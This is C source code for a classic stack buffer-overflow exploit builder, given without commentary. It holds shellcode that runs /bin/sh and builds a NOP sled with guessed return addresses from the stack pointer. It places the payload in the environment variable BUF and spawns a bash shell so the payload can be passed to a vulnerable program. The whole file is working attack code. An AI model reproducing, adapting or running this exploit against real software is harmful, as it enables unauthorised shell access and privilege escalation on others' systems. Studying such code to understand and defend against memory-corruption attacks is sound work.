#include <stdlib.h>
#include <string.h>
#include <stdio.h>

 #define DEFAULT_OFFSET                    0
 #define DEFAULT_BUFFER_SIZE             512
 #define NOP                            0x90

 char shellcode[] =
     "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
     "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
     "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[])
{
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
         *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
         buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
         *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  memcpy(buff,"BUF=",4);
  putenv(buff);
  system("/bin/bash");
}
